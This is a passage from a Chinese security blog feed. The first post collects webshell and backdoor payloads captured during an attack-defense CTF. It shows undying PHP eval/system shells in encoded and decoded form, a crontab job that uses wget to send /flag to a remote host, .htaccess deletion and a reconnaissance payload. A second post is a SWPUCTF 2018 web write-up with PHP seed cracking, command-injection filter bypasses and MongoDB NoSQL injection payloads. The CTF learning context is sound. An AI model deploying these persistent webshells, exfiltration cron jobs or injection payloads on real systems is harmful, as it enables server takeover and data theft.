base64_decode(&apos;PD9waHAKaWYoQCRfUkVRVUVTVFsiaGFzaCJdPT09ImZlYWQwZmZhMDBjMTliNmI2ZTI1ZTYwZmIzYmNlYjRiIikKewogICAgQHN5c3RlbSgkX1JFUVVFU1RbIm1veGlhb3hpNjY2Il0pOwp9Cj8+&apos;);</span><br><span class="line">            unlink(__FILE__);</span><br><span class="line">            while (TRUE) &#123;&#123;</span><br><span class="line">            if (file_get_contents($file)!==$shell) &#123;&#123; file_put_contents($file, $shell); &#125;&#125;</span><br><span class="line">            usleep(5);</span><br><span class="line">            &#125;&#125;</span><br><span class="line">            ?&gt;&quot;;</span><br><span class="line">file_put_contents($path, base64_decode($code_template), LOCK_EX)Ow== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// decode</span><br><span class="line">system(&apos;/bin/echo mo123;/bin/echo $path = &apos;/home/team/workdir/skin/.4b22331ce86c8caa0adc37039326d5fc.php&apos;;</span><br><span class="line">$code_template = &quot;&lt;?php</span><br><span class="line">            ignore_user_abort(true);</span><br><span class="line">            set_time_limit(0);</span><br><span class="line">            $file = &quot;.4b22331ce86c8caa0adc37039326d5fc.php&quot;;</span><br><span class="line">            $shell = base64_decode(&apos;&lt;?php</span><br><span class="line">if(@$_REQUEST[&quot;hash&quot;]===&quot;fead0ffa00c19b6b6e25e60fb3bceb4b&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    @system($_REQUEST[&quot;moxiaoxi666&quot;]);</span><br><span class="line">&#125;Cj8+&apos;);</span><br><span class="line">            unlink(__FILE__);</span><br><span class="line">            while (TRUE) &#123;&#123;</span><br><span class="line">            if (file_get_contents($file)!==$shell) &#123;&#123; file_put_contents($file, $shell); &#125;&#125;</span><br><span class="line">            usleep(5);</span><br><span class="line">            &#125;&#125;</span><br><span class="line">            ?&gt;&quot;;</span><br><span class="line">file_put_contents($path, base64_decode($code_template), LOCK_EX)Ow== | /usr/bin/base64 -d | /bin/cat &gt; /home/team/workdir//.4b22331ce86c8caa0adc37039326d5fc.php;/bin/echo xiaoxi456890&apos;);</span><br></pre></td></tr></table></figure></li><li><p>3: 种crontab后门定时交flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system(&apos;/bin/echo mo123;/bin/echo KiAqICogKiAqIC91c3IvYmluL3dnZXQgImh0dHA6Ly8xOTIuMTY4LjIwMC4xNTA6ODAwNS9hcGkvdGVhbS9zdWJtaXQvL2MxMzYyODI2MjI5M2M1ODVlYmZhZDM3Y2ExYzVlNzdkNDI4ZjVkY2QiIC1kICImZmxhZz0kKC9iaW4vY2F0IC9mbGFnKSIgLUggIkNvb2tpZTpkZGFhcyIK | /usr/bin/base64 -d | /bin/cat &gt;&gt; /tmp//tmp.conf ; /usr/bin/crontab /tmp//tmp.conf;/bin/echo xiaoxi456890&apos;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decode base64</span><br><span class="line">* * * * * /usr/bin/wget &quot;http://192.168.200.150:8005/api/team/submit//c13628262293c585ebfad37ca1c5e77d428f5dcd&quot; -d &quot;&amp;flag=$(/bin/cat /flag)&quot; -H &quot;Cookie:ddaas&quot;</span><br></pre></td></tr></table></figure></li><li><p>4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">system%28%27%2Fbin%2Fecho+HENCE666%3B%2Fbin%2Fecho+PD9waHAKCQlpZ25vcmVfdXNlcl9hYm9ydCh0cnVlKTsKCQlzZXRfdGltZV9saW1pdCgwKTsKCQkkZmlsZSA9ICItLThmMDI5MzhlOWQyMWU2N2JmYzg3MjQwZjU4NGQ2NDQzLnBocCI7CgkJJHNoZWxsID0gJzw%2FcGhwIGlmKCRfUkVRVUVTVFtoYXNoXT09ImY5YjY5YTA5NjUxNGYyODIxMjg5MzVmZDA3N2YyZWJiIil7JGNfMSA9IGJhc2U2NF9kZWNvZGUoc3RyX3JvdDEzKCRfUkVRVUVTVFthXSkpOyRjXzIgPSBiYXNlNjRfZGVjb2RlKHN0cl9yb3QxMygkX1JFUVVFU1RbYl0pKTskY18xKCRjXzIpO30%2FPic7CgkJdW5saW5rKF9fRklMRV9fKTsKCQl3aGlsZSAoVFJVRSkge3sKCQlpZiAoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpIT09JHNoZWxsKSB7eyBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJHNoZWxsKTsgfX0KCQl1c2xlZXAoNSk7CgkJfX0KCQk%2FPg%3D%3D+%7C+%2Fusr%2Fbin%2Fbase64+-d+%7C+%2Fbin%2Fcat+%3E+%2Fvar%2Fwww%2Fhtml%2F%2F--8f02938e9d21e67bfc87240f584d6443.php%3B%2Fbin%2Fecho+ZHANG777%27%29%3B</span><br><span class="line"></span><br><span class="line">// decode</span><br><span class="line">system(&apos;/bin/echo HENCE666;/bin/echo PD9waHAKCQlpZ25vcmVfdXNlcl9hYm9ydCh0cnVlKTsKCQlzZXRfdGltZV9saW1pdCgwKTsKCQkkZmlsZSA9ICItLThmMDI5MzhlOWQyMWU2N2JmYzg3MjQwZjU4NGQ2NDQzLnBocCI7CgkJJHNoZWxsID0gJzw/cGhwIGlmKCRfUkVRVUVTVFtoYXNoXT09ImY5YjY5YTA5NjUxNGYyODIxMjg5MzVmZDA3N2YyZWJiIil7JGNfMSA9IGJhc2U2NF9kZWNvZGUoc3RyX3JvdDEzKCRfUkVRVUVTVFthXSkpOyRjXzIgPSBiYXNlNjRfZGVjb2RlKHN0cl9yb3QxMygkX1JFUVVFU1RbYl0pKTskY18xKCRjXzIpO30/Pic7CgkJdW5saW5rKF9fRklMRV9fKTsKCQl3aGlsZSAoVFJVRSkge3sKCQlpZiAoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpIT09JHNoZWxsKSB7eyBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJHNoZWxsKTsgfX0KCQl1c2xlZXAoNSk7CgkJfX0KCQk/Pg== | /usr/bin/base64 -d | /bin/cat &gt; /var/www/html//--8f02938e9d21e67bfc87240f584d6443.php;/bin/echo ZHANG777&apos;);</span><br><span class="line"></span><br><span class="line">// decode base64</span><br><span class="line">system(&apos;/bin/echo HENCE666;/bin/echo &lt;?php</span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$file = &quot;--8f02938e9d21e67bfc87240f584d6443.php&quot;;</span><br><span class="line">$shell = &apos;&lt;?php if($_REQUEST[hash]==&quot;f9b69a096514f282128935fd077f2ebb&quot;)&#123;$c_1 = base64_decode(str_rot13($_REQUEST[a]));$c_2 = base64_decode(str_rot13($_REQUEST[b]));$c_1($c_2);&#125;?&gt;&apos;;</span><br><span class="line">unlink(__FILE__);</span><br><span class="line">while (TRUE) &#123;&#123;</span><br><span class="line">if (file_get_contents($file)!==$shell) &#123;&#123; file_put_contents($file, $shell); &#125;&#125;</span><br><span class="line">usleep(5);</span><br><span class="line">&#125;&#125;</span><br><span class="line">?Pg== | /usr/bin/base64 -d | /bin/cat &gt; /var/www/html//--8f02938e9d21e67bfc87240f584d6443.php;/bin/echo ZHANG777&apos;);</span><br></pre></td></tr></table></figure></li><li><p>5</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">%24path+%3D+%27%2Fhome%2Fteam%2Fworkdir%2Fskin%2F--ssssss.php%27%3B%24data+%3D+%27PD9waHAKICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwogICAgc2V0X3RpbWVfbGltaXQoMCk7CiAgICB3aGlsZSAoMSl7CiAgICAgICAgJHBhdGggPSAiL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLnNzc3Nzcy5waHAiOwogICAgICAgICRkYXRhID0gIjw%2FcGhwIGlmKG1kNShcJF9QT1NUWydwYXNzJ10pPT0nYzI3MjFkODM2ZGRiNjg2YjBiMDFjYjAwNjYwODk5NTAnKUBldmFsKFwkX1BPU1RbJ2NtZCddKTs%2FPiI7CiAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRwYXRoLCAkZGF0YSk7CiAgICAgICAgc3lzdGVtKCdjaG1vZCA1MDAgJy4kcGF0aCk7CiAgICAgICAgdXNsZWVwKDEwMCk7CiAgICB9CiAgICA%2FPg%3D%3D%27%3B%24data%3D+base64_decode%28%24data%29%3B%40file_put_contents%28%24path%2C%24data%29%3Bsystem%28%27chmod+500+%27.%24path%29%3Bsystem%28%27%27rm+%29</span><br><span class="line"></span><br><span class="line">// deocde</span><br><span class="line">$path = &apos;/home/team/workdir/skin/--ssssss.php&apos;;$data = &apos;PD9waHAKICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwogICAgc2V0X3RpbWVfbGltaXQoMCk7CiAgICB3aGlsZSAoMSl7CiAgICAgICAgJHBhdGggPSAiL2hvbWUvdGVhbS93b3JrZGlyL3NraW4vLnNzc3Nzcy5waHAiOwogICAgICAgICRkYXRhID0gIjw/cGhwIGlmKG1kNShcJF9QT1NUWydwYXNzJ10pPT0nYzI3MjFkODM2ZGRiNjg2YjBiMDFjYjAwNjYwODk5NTAnKUBldmFsKFwkX1BPU1RbJ2NtZCddKTs/PiI7CiAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRwYXRoLCAkZGF0YSk7CiAgICAgICAgc3lzdGVtKCdjaG1vZCA1MDAgJy4kcGF0aCk7CiAgICAgICAgdXNsZWVwKDEwMCk7CiAgICB9CiAgICA/Pg==&apos;;$data= base64_decode($data);@file_put_contents($path,$data);system(&apos;chmod 500 &apos;.$path);system(&apos;&apos;rm )</span><br><span class="line"></span><br><span class="line">// base64 decode</span><br><span class="line">$path = &apos;/home/team/workdir/skin/--ssssss.php&apos;;$data = &apos;&lt;?php</span><br><span class="line">    ignore_user_abort(true);</span><br><span class="line">    set_time_limit(0);</span><br><span class="line">    while (1)&#123;</span><br><span class="line">        $path = &quot;/home/team/workdir/skin/.ssssss.php&quot;;</span><br><span class="line">        $data = &quot;&lt;?php if(md5(\$_POST[&apos;pass&apos;])==&apos;c2721d836ddb686b0b01cb0066089950&apos;)@eval(\$_POST[&apos;cmd&apos;]);?&gt;&quot;;</span><br><span class="line">        @file_put_contents($path, $data);</span><br><span class="line">        system(&apos;chmod 500 &apos;.$path);</span><br><span class="line">        usleep(100);</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;&apos;;$data= base64_decode($data);@file_put_contents($path,$data);system(&apos;chmod 500 &apos;.$path);system(&apos;&apos;rm )</span><br></pre></td></tr></table></figure><ul><li><p>删、覆盖上传目录的.htaccess</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET //libraries/lithium/template/view/Compiler.php?along=system(&apos;/bin/echo mo123;rm /home/team/workdir/app/webroot/uploads/.htaccess;/bin/echo xiaoxi456890&apos;);</span><br></pre></td></tr></table></figure></li><li><p>还有个没看懂的<br>ip：192.168.17.11</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Becho%20%22d32d8%22%3B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D)%3B%24R%3D%22%7B%24D%7D%09%22%3Bif(substr(%24D%2C0%2C1)!%3D%22%2F%22)%7Bforeach(range(%22C%22%2C%22Z%22)as%20%24L)if(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists(%22posix_getegid%22))%3F%40posix_getpwuid(%40posix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3Becho%20%221d77b%22%3Bdie()%3B</span><br><span class="line"></span><br><span class="line">//decode</span><br><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">echo &quot;d32d8&quot;;</span><br><span class="line">$D=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">if($D==&quot;&quot;)$D=dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);</span><br><span class="line">$R=&quot;&#123;$D&#125;&quot;;</span><br><span class="line">if(substr($D,0,1)!=&quot;/&quot;)&#123;</span><br><span class="line">        foreach(range(&quot;C&quot;,&quot;Z&quot;)as$L)</span><br><span class="line">    if(is_dir(&quot;&#123;$L&#125;:&quot;)</span><br><span class="line">    )$R.=&quot;&#123;$L&#125;:&quot;;</span><br><span class="line">&#125;else&#123;$R.=&quot;/&quot;;&#125;$R.=&quot;&quot;;</span><br><span class="line">$u=(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s=($u)?$u[&quot;name&quot;]:@get_current_user();$R.=php_uname();$R.=&quot;&#123;$s&#125;&quot;;echo $R;;echo &quot;1d77b&quot;;die();</span><br></pre></td></tr></table></figure></li><li><p>Nu1l的shell1：<br>192.168.21.x</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(&apos;Nu1ls.php&apos;,base64_decode(&quot;PD9waHAKCXNldF90aW1lX2xpbWl0KDApOwoJaWdub3JlX3VzZXJfYWJvcnQoMSk7Cgl1bmxpbmsoX19GSUxFX18pOwoJd2hpbGUoMSl7CgkJZmlsZV9wdXRfY29udGVudHMoJy4vLm51MWxjdGZzLnBocCcsICc8P3BocCBAZXZhbCgkX0dFVFsnbnVsbCddKTsnKTsKCQlzeXN0ZW0oJ2NobW9kIDc3NyAuY29uZmlnLnBocCcpOwkJCQkJCgkJLy/mjIHnu63lnKhjb25maWcucGhw5Lit5YaZ5YWlCgkJdG91Y2goIi4vLm51MWxjdGZzLnBocCIsIG1rdGltZSgyMCwxNSwxLDExLDE3LDIwMTcpKTsJCgkJdXNsZWVwKDEwMCk7Cgl9Cj8+Cg==&quot;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base64解码：</span><br><span class="line">&lt;?php</span><br><span class="line">set_time_limit(0);</span><br><span class="line">ignore_user_abort(1);</span><br><span class="line">unlink(__FILE__);</span><br><span class="line">while(1)&#123;</span><br><span class="line">file_put_contents(&apos;./.nu1lctfs.php&apos;, &apos;&lt;?php @eval($_GET[&apos;null&apos;]);&apos;);</span><br><span class="line">system(&apos;chmod 777 .config.php&apos;);</span><br><span class="line">touch(&quot;./.nu1lctfs.php&quot;, mktime(20,15,1,11,17,2017));</span><br><span class="line">usleep(100);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>Nu1l的shell2：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents%28%22Nu1ls.php%22%2Cbase64_decode%28%22PD9waHAgQGV2YWwoJF9QT1NUWydob21hZWJpYyddKTs%2FPg%3D%3D%22%29%29%3B&amp;zzz=aaa</span><br><span class="line"></span><br><span class="line">//decode</span><br><span class="line">file_put_contents(&quot;Nu1ls.php&quot;,base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWydob21hZWJpYyddKTs/Pg==&quot;));&amp;zzz=aaa</span><br><span class="line"></span><br><span class="line">//file_put_contents(&quot;Nu1ls.php&quot;,base64_decode(&quot;&lt;?php @eval($_POST[&apos;homaebic&apos;]);?&gt;&quot;));&amp;zzz=aaa</span><br></pre></td></tr></table></figure></li></ul><h1 id="final"><a href="#final" class="headerlink" title="final"></a>final</h1><p>最后还有一些骚套路，等考完试写好awd框架了一起分享出来~</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://passer6y.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>SWPUCTF WEB Writeup</title>
    <link href="http://passer6y.fun/2018/12/20/Swpu%20CTF%202018%20Writeup/"/>
    <id>http://passer6y.fun/2018/12/20/Swpu CTF 2018 Writeup/</id>
    <published>2018-12-20T12:40:00.000Z</published>
    <updated>2018-12-20T12:56:02.000Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="WEb-1-用优惠码-买个-X"><a href="#WEb-1-用优惠码-买个-X" class="headerlink" title="WEb 1:用优惠码 买个 X ?"></a>WEb 1:用优惠码 买个 X ?</h1><p><a href="http://www.zip源码泄露：" target="_blank" rel="noopener">www.zip源码泄露：</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//生成优惠码</span><br><span class="line">$_SESSION[&apos;seed&apos;]=rand(0,999999999);</span><br><span class="line">function youhuima()&#123;</span><br><span class="line">mt_srand($_SESSION[&apos;seed&apos;]);</span><br><span class="line">    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">    $auth=&apos;&apos;;</span><br><span class="line">    $len=15;</span><br><span class="line">    for ( $i = 0; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        if($i&lt;=($len/2))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);</span><br><span class="line">        else</span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(&apos;Auth&apos;, $auth);</span><br><span class="line">&#125;</span><br><span class="line">//support</span><br><span class="line">if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip))&#123;</span><br><span class="line">        if (!preg_match(&quot;/\?|flag|&#125;|cat|echo|\*/i&quot;,$ip))&#123;</span><br><span class="line">               //执行命令</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">              //flag字段和某些字符被过滤!</span><br><span class="line">        &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">             // 你的输入不正确!</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>登录后，题目给了我们15位的优惠码，而购买X的优惠码是24位的，再回过来看看代码，很明显考察php随机数安全问题。</p><p>这篇文章分析的不错：<a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=585</a></p><p>简单而言，生成优惠码的每一位字母(数)使用的随机数种子相同，即php在产生一系列随机数的时候只进行了一次播种。<br>而在linux64位的系统中rand()和mt_rand()函数产生的最大随机数都是2^31-1，所以在这个范围内可以爆破。</p><p>最初想着直接用php爆破：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line"></span><br><span class="line">//生成优惠码</span><br><span class="line">function youhuima($seed)&#123;</span><br><span class="line">    mt_srand($seed);</span><br><span class="line">    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">    $auth=&apos;&apos;;</span><br><span class="line">    $len=15;</span><br><span class="line">    for ( $i = 0; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        if($i&lt;=($len/2))</span><br><span class="line">            $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);</span><br><span class="line">        else</span><br><span class="line">            $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if($auth === &quot;9vmnye6GT7TpzH3&quot;)&#123;</span><br><span class="line">        echo $seed;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">for($i=1; $i&lt;999999999; $i++)&#123;</span><br><span class="line">    youhuima($i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>结果卡了很久很久 cpu爆炸..</p><p>后来发现已经有大牛写了一个c语言爆破种子的程序：<a href="http://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">http://www.openwall.com/php_mt_seed/</a></p><p>这里踩了很多坑… 4.0版本make编译报错，3.4的版本跑出来的种子死活都不对..</p><p>后来仔细分析，这个和php版本相关：<br>3.4的爆破脚本中描述：<br><img src="http://static.zybuluo.com/Passer6y/voljmittvt811yrgn4us841g/image_1cv2gndm5cqf1dhtk611aogfc419.png" alt="image_1cv2gndm5cqf1dhtk611aogfc419.png-42.2kB"></p><p>然鹅我们题目是php7.2的版本<br><img src="https://i.loli.net/2018/12/19/5c19dd9af00c8.png" alt="php版本"></p><p>所以这里只能用4.0的爆破程序。</p><p>先将字母转换成对应的数字：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function getseed()&#123;</span><br><span class="line">    $str = &quot;8zJag6b&quot;;</span><br><span class="line">    $randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line"></span><br><span class="line">    for($i=0;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">        $pos = strpos($randStr,$str[$i]);</span><br><span class="line">        echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;</span><br><span class="line">        //整理成方便 php_mt_seed 测试的格式</span><br><span class="line">        //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后爆破：<br><img src="http://static.zybuluo.com/Passer6y/ihxipsrb1vf5sy6rsq75stuj/image_1cv2gsdach4vb54nu617ea8p526.png" alt="image_1cv2gsdach4vb54nu617ea8p526.png-53.8kB"></p><p>拿到种子后，记得在本地将php版本调到<strong>7.1+</strong>，生成24位的优惠码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function youhuima()&#123;</span><br><span class="line">    mt_srand(&apos;727588335&apos;);</span><br><span class="line">    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">    $auth=&apos;&apos;;</span><br><span class="line">    $len=24;</span><br><span class="line">    for ( $i = 0; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        if($i&lt;=($len/2))</span><br><span class="line">            $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);</span><br><span class="line">        else</span><br><span class="line">            $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);</span><br><span class="line">    &#125;</span><br><span class="line">    echo $auth;</span><br><span class="line">    echo &quot;\nsJO5ciqR&quot;;</span><br><span class="line">    setcookie(&apos;Auth&apos;, $auth);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/zlzn6vm9i8uau1ifipr8h0q3/image_1cv2gv9rmg21pu21q2m1np31ub23j.png" alt="image_1cv2gv9rmg21pu21q2m1np31ub23j.png-402.5kB"></p><p>接着考察命令执行的漏洞：<br><code>preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)</code><br>m修饰符：换行匹配，所以构造payload：<code>ip=| ls%0a127.0.0.1</code></p><p>这里可以用pcre_match贪婪匹配特性绕过？<br><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">参考</a></p><p>第二层：用\或者””绕关键字即可<br><code>ip=| c&quot;&quot;at /f&quot;&quot;lag%0a127.0.0.1</code></p><p>拿到flag:swpuctf{<strong><em>**</em></strong>08067_sec<strong>**</strong>$$%@!~~~~**}</p><h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2:"></a>Web2:</h1><p>提示phpinfo:看到了mangodb，猜想这是nosql注入<br><img src="http://static.zybuluo.com/Passer6y/1hb5j7v1x6r1000knhyjite6/image_1cv2jg7f0s4smdtn1g6tu1u806t.png" alt="image_1cv2jg7f0s4smdtn1g6tu1u806t.png-122.5kB"><br>这里$ne在mongodb中表示：!=、&lt;&gt;</p><p><code>/check.php?username[$ne]=%5C&amp;password[$ne]=%5C&amp;vertify=zxvz</code><br>即表示用户名不为\且(or)密码不为\的用户。<br>根据提示，可以猜想到密码就是flag</p><p>所以可以用$regex模糊查询</p><p>参考：<a href="https://www.freebuf.com/articles/database/95314.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/database/95314.html</a></p><p>爆密码payload：<br><code>?username[$ne]=1&amp;password[$regex]=^s&amp;vertify=h36f</code><br>爆账号payload：<br><code>?username[$regex]=1&amp;password[$ne]=1&amp;vertify=h36f</code></p><p>然后就是验证码爆破了，花上5毛钱接入打码平台：<br><img src="http://static.zybuluo.com/Passer6y/ugof50khh0rg1yky7bbn5gko/image_1cv2pilm0p6p6hk15gm1jomrpc7a.png" alt="image_1cv2pilm0p6p6hk15gm1jomrpc7a.png-380.3kB"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 